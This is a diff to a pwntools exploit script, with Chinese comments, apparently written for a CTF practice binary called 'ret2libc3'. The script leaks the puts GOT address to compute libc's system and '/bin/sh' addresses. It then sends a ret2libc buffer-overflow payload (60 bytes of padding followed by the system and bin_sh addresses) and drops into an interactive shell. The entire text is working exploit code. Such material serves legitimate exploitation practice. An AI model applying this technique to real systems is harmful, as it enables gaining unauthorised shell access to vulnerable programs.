@@ -32,9 +32,9 @@ ret2libc3 = ELF('./ret2libc3')
 
 #获取puts的got地址
 puts_plt = ret2libc3.got['puts']
-data = sh.recvuntil(b'Give me an address (in dec) :')
+#data = sh.recvuntil(b"Give me an address (in dec) :")
 #程序中这里会将输入的地址取值，输入got表地址，便得到了函数地址
-sh.send(str(puts_plt))
+sh.sendlineafter(b"Give me an address (in dec) :",str(puts_plt))
 #接收一行数据
 data = sh.recvline()
 #根据冒号将数据拆分成两部分 然后取出最后一部分，用strip() 去除收尾空格，再用int转为整数
@@ -45,13 +45,10 @@ puts_address = int(data.split(b':')[-1].strip(), 16)
 system_address = puts_address - 0x2C4C0
 bin_sh = puts_address + 0x120723
 
-read_addr = 0x080483B0
-pop_pop_pop_ret = 0x080486cd
 #print(hex(system_address))               
 payload = flat([b'a'*60,system_address,0xcafecafe,bin_sh])
 
 sh.send(payload)
-
 
 sh.interactive()
 ```
